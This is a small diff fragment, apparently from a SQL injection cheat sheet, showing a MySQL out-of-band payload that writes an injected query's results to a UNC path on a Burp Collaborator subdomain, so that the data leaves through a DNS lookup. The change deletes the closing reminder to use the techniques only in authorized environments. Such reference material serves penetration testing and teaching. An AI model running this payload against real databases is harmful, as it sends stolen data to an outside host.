@@ -320,5 +320,3 @@ Perform a DNS lookup containing the results of an injected query:
 | **MySQL**   | `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'` |
 
 ---
-
-Use these techniques responsibly and only in authorized environments.
